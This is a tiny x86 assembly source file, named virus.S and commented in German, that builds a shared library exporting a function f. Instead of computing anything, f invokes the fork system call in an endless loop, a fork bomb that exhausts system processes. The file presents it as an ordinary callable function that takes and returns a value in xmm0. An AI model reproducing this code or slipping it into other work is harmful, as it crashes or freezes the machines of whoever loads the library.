.intel_syntax noprefix
.global f
.text

# Kompilieren mit: gcc -shared virus.S -o virus.so
# Eingabe- und R�ckgabewert in xmm0!

f:
	mov eax, 2 	# System call 2 (fork) wird in eax geladen
	int 0x80	# System call wird mit Kernel  durchgef�hrt
	jmp f		# Endlosschleife
ret